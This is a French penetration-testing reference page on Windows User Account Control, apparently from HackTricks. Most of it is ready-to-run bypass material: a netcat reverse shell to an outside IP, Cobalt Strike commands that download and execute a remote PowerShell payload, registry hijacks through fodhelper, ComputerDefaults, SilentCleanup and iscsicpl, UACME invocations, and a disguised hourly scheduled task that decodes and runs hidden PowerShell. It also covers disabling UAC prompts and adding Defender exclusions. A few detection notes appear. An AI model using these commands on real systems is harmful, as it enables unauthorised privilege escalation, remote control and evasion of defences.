# UAC - Contrôle de compte d'utilisateur

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Le contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui affiche une **demande de consentement pour les activités nécessitant une élévation de privilèges**. Les applications ont différents niveaux d’`intégrité`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient compromettre le système**. Lorsque l’UAC est activé, les applications et les tâches **s’exécutent toujours dans le contexte de sécurité d’un compte non administrateur**, sauf si un administrateur autorise explicitement ces applications/tâches à accéder au système avec des privilèges d’administrateur. Il s’agit d’une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais elle n’est pas considérée comme une frontière de sécurité.<sup>[[2]](#references)</sup>

Pour plus d’informations sur les niveaux d’intégrité :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsque l’UAC est en place, un utilisateur administrateur reçoit 2 tokens : un token d’utilisateur standard, pour effectuer les actions habituelles avec une intégrité moyenne, et un autre disposant des privilèges d’administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) décrit en détail le fonctionnement de l’UAC, notamment le processus de connexion, l’expérience utilisateur et l’architecture de l’UAC.<sup>[[2]](#references)</sup> Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l’UAC en fonction de leur organisation, au niveau local (à l’aide de secpol.msc), ou les configurer et les déployer via des objets de stratégie de groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont décrits en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de stratégie de groupe configurables pour l’UAC. Le tableau suivant fournit des informations supplémentaires :

| Paramètre de stratégie de groupe                                                                                                                                                                                                                                                                                                                                                           | Clé de registre                | Paramètre par défaut                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Contrôle de compte d'utilisateur : mode d'approbation administrateur pour le compte Administrateur intégré](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Désactivé)                                             |
| [Contrôle de compte d'utilisateur : comportement de l'invite d'élévation pour les administrateurs en mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Demander le consentement pour les fichiers binaires non Windows sur le Bureau sécurisé) |
| [Contrôle de compte d'utilisateur : comportement de l'invite d'élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Demander les informations d’identification sur le Bureau sécurisé)         |
| [Contrôle de compte d'utilisateur : détecter les installations d'applications et demander une élévation de privilèges](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Activé ; désactivé par défaut dans l’édition Enterprise)           |
| [Contrôle de compte d'utilisateur : élever uniquement les exécutables signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Désactivé)                                             |
| [Contrôle de compte d'utilisateur : élever uniquement les applications UIAccess installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Activé)                                              |
| [Contrôle de compte d'utilisateur : exécuter tous les administrateurs en mode d'approbation administrateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Activé)                                              |
| [Contrôle de compte d'utilisateur : autoriser les applications UIAccess à demander une élévation sans utiliser le Bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Désactivé)                                             |
| [Contrôle de compte d'utilisateur : basculer vers le Bureau sécurisé lors d'une demande d'élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Activé)                                              |
| [Contrôle de compte d'utilisateur : virtualiser les échecs d'écriture dans les fichiers et le registre vers des emplacements propres à chaque utilisateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Activé)                                              |

### Stratégies d'installation de logiciels sur Windows

Par défaut, les **stratégies de sécurité locales** (« secpol.msc » sur la plupart des systèmes) sont configurées pour **empêcher les utilisateurs non administrateurs d’installer des logiciels**. Cela signifie que même si un utilisateur non administrateur peut télécharger le programme d’installation de votre logiciel, il ne pourra pas l’exécuter sans compte administrateur.

### Clés de registre pour obliger l'UAC à demander une élévation de privilèges

En tant qu’utilisateur standard sans droits d’administrateur, vous pouvez faire en sorte que le compte « standard » soit **invité par l’UAC à fournir ses informations d’identification** lorsqu’il tente d’effectuer certaines actions. Cela nécessite de modifier certaines **clés de registre**, ce qui requiert des autorisations d’administrateur, à moins qu’il n’existe un **UAC bypass** ou que l’attaquant soit déjà connecté en tant qu’administrateur.

Même si l’utilisateur appartient au groupe **Administrateurs**, ces modifications obligent l’utilisateur à **saisir à nouveau les informations d’identification de son compte** pour effectuer des actions d’administration.

**En pratique, cela n’est utile que si vous disposez déjà d’un token élevé, d’un UAC bypass ou d’une mauvaise configuration qui vous permet de modifier ces clés ; sinon, l’écriture dans le registre elle-même est bloquée.**

Les clés et entrées de registre à modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` :
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Cette opération peut également être effectuée manuellement à l’aide de l’outil Stratégie de sécurité locale. Une fois les modifications apportées, les opérations d’administration invitent l’utilisateur à saisir à nouveau ses informations d’identification.

### Remarque

**Le contrôle de compte d'utilisateur n’est pas une frontière de sécurité.** Les utilisateurs standard ne peuvent donc pas sortir de leur compte et obtenir des droits d’administrateur sans exploiter une vulnérabilité d’élévation de privilèges locale.

### Demander à un utilisateur un « accès complet à l’ordinateur »

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Privilèges UAC

- Internet Explorer Protected Mode utilise des contrôles d’intégrité pour empêcher les processus de niveau d’intégrité élevé (comme les navigateurs web) d’accéder aux données de faible niveau d’intégrité (comme le dossier des fichiers Internet temporaires). Pour cela, le navigateur est exécuté avec un jeton de faible niveau d’intégrité. Lorsque le navigateur tente d’accéder aux données stockées dans la zone de faible niveau d’intégrité, le système d’exploitation vérifie le niveau d’intégrité du processus et autorise l’accès en conséquence. Cette fonctionnalité aide à empêcher les attaques d’exécution de code à distance d’accéder aux données sensibles du système.
- Lorsqu’un utilisateur ouvre une session Windows, le système crée un jeton d’accès contenant une liste des privilèges de l’utilisateur. Les privilèges sont définis comme la combinaison des droits et des capacités d’un utilisateur. Le jeton contient également une liste des identifiants de l’utilisateur, qui servent à authentifier celui-ci auprès de l’ordinateur et des ressources du réseau.

### Autoadminlogon

Pour configurer Windows afin qu’un utilisateur spécifique ouvre automatiquement une session au démarrage, définissez la **clé de registre `AutoAdminLogon`**. Cela peut être utile dans les environnements de bornes interactives ou à des fins de test. Utilisez cette configuration uniquement sur des systèmes sécurisés, car le mot de passe est exposé dans le registre.

Définissez les clés suivantes à l’aide de l’Éditeur du Registre ou de `reg add` :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` :
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Pour rétablir le comportement normal d’ouverture de session, définissez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Notez que si vous avez un accès graphique à la victime, le UAC bypass est simple : il suffit de cliquer sur « Oui » lorsque l’invite UAC apparaît.

Le UAC bypass est nécessaire dans la situation suivante : **l’UAC est activé, votre processus s’exécute dans un contexte d’intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de préciser qu’il est **beaucoup plus difficile de contourner l’UAC lorsque son niveau de sécurité est maximal (Always) que lorsqu’il est réglé sur l’un des autres niveaux (Default).**

### Triage rapide depuis un shell de niveau d’intégrité moyen

Avant de tenter un bypass, vérifiez que vous êtes dans la situation appropriée et associez la version du système hôte aux méthodes connues comme fonctionnelles :

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Notes pratiques :
- Si `EnableLUA=0`, vous n’avez pas besoin de bypass : tout jeton admin peut demander directement un niveau d’intégrité élevé.
- `ConsentPromptBehaviorAdmin=2` ou `5` est le scénario courant pour les bypass auto-elevate / basés sur COM.
- `Always Notify` augmente le niveau de difficulté, mais vous devriez tout de même tester la build exacte au lieu de supposer que l’échec est garanti : UACME suit encore certaines méthodes compatibles avec `AlwaysNotify` sur les builds modernes de Windows.<sup>[[3]](#references)</sup>

### UAC désactivé

Si UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` vaut **`0`**), vous pouvez **exécuter un reverse shell avec des privilèges admin** (niveau d’intégrité élevé) avec quelque chose comme :

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### Contournement de l’UAC avec duplication de jeton

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### RPC local + objet de débogage réutilisable

L’interface RPC locale AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` peut créer un processus avec le débogage activé. Les processus créés avec le débogage sur le même thread partagent l’objet de débogage du thread ; un événement de débogage de création fournit un handle de processus avec un accès complet, même lorsque le résultat RPC lui-même n’accorde qu’un accès limité. La réutilisation d’un objet de débogage devient ainsi une primitive UAC pour un membre du groupe Administrators avec un niveau d’intégrité moyen.<sup>[[11]](#references)[[12]](#references)</sup>

Une chaîne pratique est la suivante :<sup>[[11]](#references)[[12]](#references)</sup>

1. Appelez la méthode RPC locale (directement ou via `NdrAsyncClientCall`) pour créer un processus sacrifiable non élevé avec le débogage activé.
2. Interrogez `ProcessDebugObjectHandle` avec `NtQueryInformationProcess`, détachez-le avec `NtRemoveProcessDebug`, conservez l’objet et terminez le processus sacrifiable.
3. Utilisez la même interface RPC pour créer un processus auto-élevé de confiance, puis associez l’objet sauvegardé au thread appelant via `DbgUiSetThreadDebugObject`.
4. Appelez `WaitForDebugEvent` et récupérez le handle de processus `CREATE_PROCESS_DEBUG_EVENT` ; dupliquez-le avec `NtDuplicateObject` avant de continuer.
5. Fournissez le handle dupliqué à `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` et lancez le payload avec une structure de démarrage étendue. Cela réutilise à la fois le contexte du processus élevé et donne au processus enfant une relation parent qui semble fiable.

Recherchez cette courte séquence plutôt que le seul binaire auto-élevé : création de processus via RPC local AppInfo, requêtes `ProcessDebugObjectHandle`, détachement/rattachement du débogueur, événement de débogage de création immédiat, duplication de handle et processus enfant dont le parent enregistré ne correspond pas au processus ayant effectué les appels de création d’API.<sup>[[12]](#references)</sup>

### **Très** basique « contournement » de l’UAC (accès complet au système de fichiers)

Si vous disposez d’un shell avec un utilisateur appartenant au groupe Administrators, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement en tant que nouveau lecteur et vous aurez **accès à tout le contenu du système de fichiers** (même au dossier personnel de l’Administrateur).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass avec Cobalt Strike

Les techniques de Cobalt Strike ne fonctionneront que si UAC n’est pas réglé sur son niveau de sécurité maximal.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** et **Metasploit** proposent également plusieurs modules pour **bypass** l’**UAC**.

### Interfaces COM avec élévation (`ICMLuaUtil` / `CMSTPLUA`)

Les objets COM à élévation automatique restent une surface UAC pratique sur les versions récentes. UACME suit toujours `ICMLuaUtil` comme fonctionnel sur les branches actuelles de Windows, et les outils offensifs continuent d’adapter `CMSTPLUA` en combinant un processus sur le bureau interactif, une exécution 64 bits et parfois une usurpation du PEB/processus avant d’invoquer l’Elevation Moniker COM.<sup>[[3]](#references)</sup>

Conseils pratiques :
- Privilégiez un processus **64 bits** dans la **session interactive** de l’utilisateur (généralement `explorer.exe` ou un de ses processus enfants).
- Si un shell brut échoue, réessayez avec une implémentation BOF / UACME plutôt qu’un simple wrapper `CreateProcess`.
- Attendez-vous à ce que le processus enfant soit lancé dans un **processus distinct avec élévation** ; de nombreux BOF n’élèvent pas le beacon actuel sur place.

### KRBUACBypass

Documentation et outil sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de UAC bypass

[**UACME**](https://github.com/hfiref0x/UACME) est une collection de techniques de UAC bypass. Compilez-le avec Visual Studio ou MSBuild ; la compilation crée plusieurs exécutables (par exemple, `Source\Akagi\output\x64\Debug\Akagi.exe`), choisissez donc la méthode adaptée à la version cible.<sup>[[3]](#references)</sup>\
Attention : certains bypass lancent des programmes ou des invites visibles qui peuvent alerter l’utilisateur.<sup>[[3]](#references)</sup>

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**.<sup>[[3]](#references)</sup> Vous pouvez rechercher une technique qui affecte vos versions :

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Aussi, en utilisant [cette page](https://en.wikipedia.org/wiki/Windows_10_version_history), vous obtenez la version Windows `1607` à partir des numéros de build.

Une méthode pratique consiste à **évaluer d’abord la build de l’hôte**, puis à lancer la méthode correspondante :

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` compare rapidement le build local à ses méthodes UAC connues, ce qui permet d’écarter rapidement les PoC obsolètes.<sup>[[4]](#references)</sup>
- `UACME` reste le meilleur catalogue public pour associer un bypass à un build précis. La version 3.7.1 a ajouté les méthodes 83–85, tandis que la version précédente a retesté les méthodes existantes sur **Windows 11 25H2** ; vérifiez à nouveau le tableau des méthodes et les notes de version au lieu de supposer qu’un ancien PoC fonctionne toujours sans modification.<sup>[[3]](#references)[[9]](#references)</sup>

### Chaînes WNF/UIAccess compatibles avec Always Notify (UACME 3.7.1)

`Always Notify` n’élimine pas tous les bypass UAC. UACME 3.7.1 implémente trois nouvelles méthodes x64 qui combinent un état d’environnement/protocole contrôlé par l’utilisateur avec le comportement d’une tâche planifiée élevée ou d’UIAccess, et les marque toutes comme `AlwaysNotify compatible` :<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** rediriger `SystemRoot` afin que la tâche `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, déclenchée par WNF, fasse charger latéralement `unifiedconsent.dll` par `taskhostw.exe` élevé. UACME la suit depuis le build 19041 de Windows 10.
- **84 — TabTip:** utiliser la même primitive de variable d’environnement contre UIAccess `TabTip.exe`, qui charge `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ou `rsaenh.dll` selon le build, puis pivoter depuis le contexte UIAccess à intégrité élevée obtenu. UACME la suit depuis Windows 8.1 / Server 2016.
- **85 — Narrator:** détourner le protocole `feedback-hub` par utilisateur, piloter Narrator avec `Alt+CapsLock+F`, puis lancer une copie modifiable de `osk.exe` qui charge latéralement `OskSupport.dll`. Cette méthode nécessite un bureau interactif et est suivie depuis Windows 10 1809 / Server 2019.

Après avoir compilé les unités de payload et Akagi comme indiqué dans la documentation d’UACME, invoquez le numéro de méthode correspondant (la commande est facultative et vaut `cmd.exe` par défaut) :

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Les méthodes 84 et 85 dépendent de UIAccess/de l’interaction avec le bureau ; ne vous attendez donc pas à ce qu’elles fonctionnent sans modification depuis Session 0 ou un shell de service non interactif. Les trois méthodes manipulent l’état de l’environnement/du protocole et déposent des DLL ; examinez l’implémentation et supprimez ces artefacts après les tests.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (détournement du registre)

Le binaire de confiance `fodhelper.exe` est automatiquement élevé sur les versions modernes de Windows. Lorsqu’il est lancé, il interroge le chemin de registre par utilisateur ci-dessous sans valider le verbe `DelegateExecute`. Y placer une commande permet à un processus à intégrité moyenne (dont l’utilisateur fait partie des Administrateurs) de lancer un processus à intégrité élevée sans invite UAC.

Chemin de registre interrogé par fodhelper :
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez-le)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notes:
- Fonctionne lorsque l’utilisateur actuel est membre du groupe Administrateurs et que le niveau UAC est défini par défaut/assoupli (pas sur Always Notify avec des restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour lancer un PowerShell 64 bits depuis un processus 32 bits sous Windows 64 bits.
- Le payload peut être n’importe quelle commande (PowerShell, cmd ou chemin vers un EXE). Évitez les interfaces utilisateur qui affichent des invites pour rester discret.

#### Déclencheur `ComputerDefaults.exe` pour le même handler `ms-settings`

`ComputerDefaults.exe` résout la même association par utilisateur `ms-settings\Shell\Open\command` que `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Après avoir défini la commande par défaut et la valeur `DelegateExecute` vide comme ci-dessus, utilisez `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` comme déclencheur alternatif ; ne répétez pas la configuration du registre.<sup>[[13]](#references)[[14]](#references)</sup> Les prérequis concernant l’administrateur à intégrité moyenne et la stratégie UAC mentionnés ci-dessus pour `fodhelper.exe` s’appliquent toujours.<sup>[[2]](#references)[[3]](#references)</sup> UACME répertorie ce déclencheur à partir de Windows 10 RS4 (build 17134) ; vérifiez donc sa disponibilité sur le build cible.<sup>[[3]](#references)</sup>

#### Variante de détournement CurVer/extension (HKCU uniquement)

Des échantillons récents qui exploitent `fodhelper.exe` évitent `DelegateExecute` et **redirigent plutôt le ProgID `ms-settings`** via la valeur `CurVer par utilisateur`. Le binaire à élévation automatique résout toujours le handler sous `HKCU` ; aucun jeton d’administrateur n’est donc nécessaire pour créer les clés :<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Une fois élevé, un malware **désactive souvent les futures invites** en définissant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectue d’autres opérations d’évasion des défenses (p. ex., `Add-MpPreference -ExclusionPath C:\ProgramData`) et recrée la persistance pour s’exécuter avec un niveau d’intégrité élevé. Une tâche de persistance classique stocke sur le disque un **script PowerShell chiffré par XOR**, puis le décode et l’exécute en mémoire toutes les heures :<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Cette variante nettoie toujours le dropper et ne laisse que les payloads staged, ce qui fait que la détection repose sur la surveillance du **`CurVer` hijack**, de la modification de `ConsentPromptBehaviorAdmin`, de la création d’exclusions Defender ou des tâches planifiées qui déchiffrent PowerShell en mémoire.<sup>[[5]](#references)</sup>

### Contournement de l’UAC via la tâche `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` lance `cleanmgr.exe` avec les privilèges les plus élevés et développe `%windir%` à partir de l’environnement utilisateur. Si vous contrôlez `HKCU\Environment\windir`, vous pouvez rediriger cette expansion vers une commande arbitraire et obtenir un niveau d’intégrité élevé sans boîte de dialogue de consentement.<sup>[[8]](#references)</sup> Cette méthode mérite toujours d’être testée sur les versions récentes, car UACME maintient cette technique active et le suivi récent des problèmes indique que Windows 11 24H2 pourrait ne nécessiter que de légers ajustements des guillemets.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Si la tâche cite le chemin sur cette build, réessayez avec un payload se terminant par un guillemet (par exemple `cmd.exe"`). Nettoyez toujours `HKCU\Environment\windir` après les tests.

#### Plus de contournements UAC

De nombreux contournements UAC classiques qui abusent des flux d’interface utilisateur, des objets COM ou des interactions avec le bureau nécessitent une **session interactive complète** avec la victime ; un shell `nc.exe` classique ou un service exécuté dans la **Session 0** ne suffit souvent pas.

Vous pouvez souvent résoudre ce problème avec une session **meterpreter**. Migrez vers un **processus** dont la valeur **Session** est égale à **1** :

![Pointez ms-settings vers une extension personnalisée (.thm) et associez cette extension à notre payload - Plus de contournements UAC : Vous pouvez y parvenir avec une session meterpreter. Migrez vers un processus dont la valeur Session...](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### Contournement UAC avec GUI

Si vous avez accès à une **GUI, vous pouvez simplement accepter l’invite UAC** lorsqu’elle apparaît ; vous n’avez pas vraiment besoin d’un contournement technique. Par conséquent, obtenir une session GUI suffit souvent à contourner les contraintes pratiques ajoutées par UAC.

De plus, si vous obtenez une session GUI utilisée par quelqu’un (éventuellement via RDP), **certains outils seront exécutés en tant qu’administrateur** et vous permettront d’**exécuter** directement un **cmd**, par exemple **en tant qu’administrateur**, sans qu’une nouvelle invite UAC apparaisse, comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cette méthode peut être un peu plus **furtive**.

### Contournement UAC par brute-force bruyant

Si le bruit est acceptable, un outil comme [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) peut demander à plusieurs reprises une élévation jusqu’à ce que l’utilisateur l’accepte.

### Votre propre contournement - Méthodologie de base pour contourner UAC

Si vous examinez **UACME**, vous remarquerez que **de nombreux contournements UAC abusent du DLL hijacking** (souvent en faisant charger par un binaire élevé une DLL contrôlée par l’attaquant depuis un chemin accessible en écriture). [Lisez ceci pour apprendre à trouver une vulnérabilité de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui s’**autoélève** (vérifiez qu’il s’exécute avec un niveau d’intégrité élevé).
2. Avec procmon, trouvez les événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous devrez probablement **écrire** la DLL dans des **chemins protégés** (comme C:\Windows\System32), où vous n’avez pas les permissions d’écriture. Vous pouvez contourner ce problème avec :
   1. **wusa.exe** : Windows 7, 8 et 8.1. Cet outil permet d’extraire le contenu d’un fichier CAB dans des chemins protégés (car il s’exécute avec un niveau d’intégrité élevé).
   2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le chemin protégé et exécuter le binaire vulnérable qui s’autoélève.

### Autre technique de contournement UAC

Elle consiste à vérifier si un **binaire autoElevated** tente de lire dans le **registre** le **nom/chemin** d’un **binaire** ou d’une **commande** à **exécuter** (c’est plus intéressant si le binaire recherche cette information dans **HKCU**).

### Contournement UAC via `SysWOW64\iscsicpl.exe` + DLL hijack du `PATH` utilisateur

Le binaire 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` s’**autoélève** et peut être exploité pour charger `iscsiexe.dll` selon l’ordre de recherche. Si vous pouvez placer une DLL `iscsiexe.dll` malveillante dans un dossier **accessible en écriture par l’utilisateur**, puis modifier le `PATH` de l’utilisateur actuel (par exemple via `HKCU\Environment\Path`) pour que ce dossier soit recherché, Windows peut charger la DLL de l’attaquant dans le processus élevé `iscsicpl.exe` **sans afficher d’invite UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Remarques pratiques :
- Cette technique est utile lorsque l’utilisateur actuel appartient au groupe **Administrators**, mais s’exécute avec un niveau d’intégrité **Medium** à cause de UAC.
- La copie **SysWOW64** est celle qui est pertinente pour ce contournement. Considérez la copie **System32** comme un binaire distinct et validez son comportement séparément.
- Cette primitive combine **autoélévation** et **DLL search-order hijacking** ; le même workflow ProcMon que pour les autres contournements UAC permet de vérifier le chargement de la DLL manquante.

Flux minimal :

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Idées de détection :
- Déclencher une alerte sur `reg add` / les écritures dans le registre vers `HKCU\Environment\Path` immédiatement suivies de l’exécution de `C:\Windows\SysWOW64\iscsicpl.exe`.
